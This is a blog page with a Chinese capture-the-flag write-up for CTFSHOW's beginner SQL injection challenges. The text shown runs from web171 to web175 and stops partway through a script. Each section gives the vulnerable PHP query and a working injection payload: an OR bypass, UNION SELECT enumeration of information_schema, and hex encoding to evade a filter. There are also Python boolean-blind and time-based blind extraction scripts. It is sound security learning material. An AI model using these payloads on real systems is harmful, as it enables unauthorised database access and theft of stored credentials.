<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="web17112&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&amp;#x27;flag&amp;#x27; and id &#x3D; &amp;#x27;&quot;.$_GET[&amp;#x27;id&amp;#x27;].&quot;&amp;#x27; limit 1;&quot;; 无过滤的字符型注入。payload: 1">
<meta property="og:type" content="article">
<meta property="og:title" content="Practice - CTFSHOW WEB入门 SQL注入篇">
<meta property="og:url" content="https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/index.html">
<meta property="og:site_name" content="Recharging Runtime">
<meta property="og:description" content="web17112&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&amp;#x27;flag&amp;#x27; and id &#x3D; &amp;#x27;&quot;.$_GET[&amp;#x27;id&amp;#x27;].&quot;&amp;#x27; limit 1;&quot;; 无过滤的字符型注入。payload: 1">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-07-29T14:42:00.000Z">
<meta property="article:modified_time" content="2022-06-18T14:55:32.368Z">
<meta property="article:author" content="b_y">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Practice">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Practice - CTFSHOW WEB入门 SQL注入篇</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2021/09/28/ctfshow-web-getting-started-php-features/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/07/05/gkctf-x-dasctf-emergency-challenge-cup-2021-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&text=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&title=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&is_video=false&description=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 SQL注入篇&body=Check out this article: https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&title=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&title=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&title=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&title=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&name=Practice - CTFSHOW WEB入门 SQL注入篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2021/07/29/ctfshow-web-getting-started-sql-injection/&t=Practice - CTFSHOW WEB入门 SQL注入篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web171"><span class="toc-number">1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web172"><span class="toc-number">2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web173"><span class="toc-number">3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web174"><span class="toc-number">4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web175"><span class="toc-number">5.</span> <span class="toc-text">web175</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web176"><span class="toc-number">6.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web177"><span class="toc-number">7.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web178"><span class="toc-number">8.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web179"><span class="toc-number">9.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web180"><span class="toc-number">10.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web181"><span class="toc-number">11.</span> <span class="toc-text">web181</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web182"><span class="toc-number">12.</span> <span class="toc-text">web182</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web183"><span class="toc-number">13.</span> <span class="toc-text">web183</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web184"><span class="toc-number">14.</span> <span class="toc-text">web184</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web185"><span class="toc-number">15.</span> <span class="toc-text">web185</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web186"><span class="toc-number">16.</span> <span class="toc-text">web186</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web187"><span class="toc-number">17.</span> <span class="toc-text">web187</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web188"><span class="toc-number">18.</span> <span class="toc-text">web188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web189"><span class="toc-number">19.</span> <span class="toc-text">web189</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web190"><span class="toc-number">20.</span> <span class="toc-text">web190</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web191"><span class="toc-number">21.</span> <span class="toc-text">web191</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web192"><span class="toc-number">22.</span> <span class="toc-text">web192</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web193"><span class="toc-number">23.</span> <span class="toc-text">web193</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web194"><span class="toc-number">24.</span> <span class="toc-text">web194</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web195"><span class="toc-number">25.</span> <span class="toc-text">web195</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web196"><span class="toc-number">26.</span> <span class="toc-text">web196</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web197"><span class="toc-number">27.</span> <span class="toc-text">web197</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web198"><span class="toc-number">28.</span> <span class="toc-text">web198</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web199"><span class="toc-number">29.</span> <span class="toc-text">web199</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web200"><span class="toc-number">30.</span> <span class="toc-text">web200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web201"><span class="toc-number">31.</span> <span class="toc-text">web201</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web202"><span class="toc-number">32.</span> <span class="toc-text">web202</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web203"><span class="toc-number">33.</span> <span class="toc-text">web203</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web204"><span class="toc-number">34.</span> <span class="toc-text">web204</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web205"><span class="toc-number">35.</span> <span class="toc-text">web205</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web206"><span class="toc-number">36.</span> <span class="toc-text">web206</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web207"><span class="toc-number">37.</span> <span class="toc-text">web207</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web208"><span class="toc-number">38.</span> <span class="toc-text">web208</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web209"><span class="toc-number">39.</span> <span class="toc-text">web209</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web210"><span class="toc-number">40.</span> <span class="toc-text">web210</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web211"><span class="toc-number">41.</span> <span class="toc-text">web211</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web212"><span class="toc-number">42.</span> <span class="toc-text">web212</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web213"><span class="toc-number">43.</span> <span class="toc-text">web213</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web214"><span class="toc-number">44.</span> <span class="toc-text">web214</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web215"><span class="toc-number">45.</span> <span class="toc-text">web215</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web216"><span class="toc-number">46.</span> <span class="toc-text">web216</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web217"><span class="toc-number">47.</span> <span class="toc-text">web217</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web218"><span class="toc-number">48.</span> <span class="toc-text">web218</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web219"><span class="toc-number">49.</span> <span class="toc-text">web219</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web220"><span class="toc-number">50.</span> <span class="toc-text">web220</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web221"><span class="toc-number">51.</span> <span class="toc-text">web221</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web222"><span class="toc-number">52.</span> <span class="toc-text">web222</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web223"><span class="toc-number">53.</span> <span class="toc-text">web223</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web224"><span class="toc-number">54.</span> <span class="toc-text">web224</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web225"><span class="toc-number">55.</span> <span class="toc-text">web225</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E8%A7%A3%E6%B3%95"><span class="toc-number">55.1.</span> <span class="toc-text">预处理解法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#handler-%E8%A7%A3%E6%B3%95"><span class="toc-number">55.2.</span> <span class="toc-text">handler 解法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web226"><span class="toc-number">56.</span> <span class="toc-text">web226</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web227"><span class="toc-number">57.</span> <span class="toc-text">web227</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web228"><span class="toc-number">58.</span> <span class="toc-text">web228</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web229"><span class="toc-number">59.</span> <span class="toc-text">web229</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web230"><span class="toc-number">60.</span> <span class="toc-text">web230</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web231"><span class="toc-number">61.</span> <span class="toc-text">web231</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web232"><span class="toc-number">62.</span> <span class="toc-text">web232</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web233"><span class="toc-number">63.</span> <span class="toc-text">web233</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web234"><span class="toc-number">64.</span> <span class="toc-text">web234</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web235"><span class="toc-number">65.</span> <span class="toc-text">web235</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web236"><span class="toc-number">66.</span> <span class="toc-text">web236</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web237"><span class="toc-number">67.</span> <span class="toc-text">web237</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web238"><span class="toc-number">68.</span> <span class="toc-text">web238</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web239"><span class="toc-number">69.</span> <span class="toc-text">web239</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web240"><span class="toc-number">70.</span> <span class="toc-text">web240</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web241"><span class="toc-number">71.</span> <span class="toc-text">web241</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web242"><span class="toc-number">72.</span> <span class="toc-text">web242</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web243"><span class="toc-number">73.</span> <span class="toc-text">web243</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web244"><span class="toc-number">74.</span> <span class="toc-text">web244</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web245"><span class="toc-number">75.</span> <span class="toc-text">web245</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web246"><span class="toc-number">76.</span> <span class="toc-text">web246</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web247"><span class="toc-number">77.</span> <span class="toc-text">web247</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web248"><span class="toc-number">78.</span> <span class="toc-text">web248</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web249"><span class="toc-number">79.</span> <span class="toc-text">web249</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web250"><span class="toc-number">80.</span> <span class="toc-text">web250</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web251"><span class="toc-number">81.</span> <span class="toc-text">web251</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web252"><span class="toc-number">82.</span> <span class="toc-text">web252</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web253"><span class="toc-number">83.</span> <span class="toc-text">web253</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Practice - CTFSHOW WEB入门 SQL注入篇
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">b_y</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-07-29T14:42:00.000Z" itemprop="datePublished">2021-07-29</time>
        
        (Updated: <time datetime="2022-06-18T14:55:32.368Z" itemprop="dateModified">2022-06-18</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Practice/" rel="tag">Practice</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>无过滤的字符型注入。<br>payload: <code>1&#39;or&#39;1&#39;=&#39;1</code><br>滑到底找到flag。    </p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无过滤的字符型注入，添加了条件限制 <code>username!=&#39;flag&#39;</code>，要用联合查询注入。<br>已给出sql语句，不再用 <code>0&#39;union select 1,2 %23</code> 或 <code>1&#39; order by 2 %23</code> 确定列数。<br>payload: <code>0&#39; union select 1,(select password from ctfshow_user2 where username=&#39;flag&#39;) %23</code><br>密码栏出flag。    </p>
<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，添加了检查结果中是否匹配正则表达式 <code>/flag/i</code> ，若匹配则查询失败。<br>先用上一题的payload打一下试试<br>payload: <code>0&#39; union select 1,2,(select password from ctfshow_user2 where username=&#39;flag&#39;) %23</code><br>密码栏出现的不是flag而是 <code>not_here</code>，查表名<br>payload: <code>0&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</code><br>结果<br><code>ctfshow_user,ctfshow_user2,ctfshow_user3</code><br>查第一个表<br>payload: <code>0&#39; union select 1,2,(select password from ctfshow_user where username=&#39;flag&#39;) %23</code><br>查询失败，返回结果触发了正则过滤。添加hex函数绕过正则过滤<br>payload: <code>0&#39; union select 1,2,hex((select password from ctfshow_user where username=&#39;flag&#39;)) %23</code><br>结果解码后<br><code>flag_not_here</code><br>查第三个表<br>payload: <code>0&#39; union select 1,2,hex((select password from ctfshow_user3 where username=&#39;flag&#39;)) %23</code><br>密码栏hex解码出flag。    </p>
<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，更改正则表达式 <code>/flag|[0-9]/i</code>，返回结果中不能有数字。<br>hex，to_base64里面也有数字，根据给出的查询语句，构造 payload 写个布尔盲注脚本。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://168b1d40-414d-4b42-a7cd-1cb5fd00bfe6.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>):</span><br><span class="line">    response = requests.get(url + payload.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        point = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">            start = point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = point</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>脚本输出flag。    </p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无过滤字符型注入，更改正则表达式为 <code>/[\x00-\x7f]/i</code>，过滤了 ascii 0-127，相当于没有回显，把上一题的脚本改为时间盲注    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,sleep(2),1) %23&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://dc63c6a5-aa8b-4e21-a765-56eb704e4809.challenge.ctf.show:8080/api/v5.php?id=&quot;</span></span><br><span class="line"></span><br><span 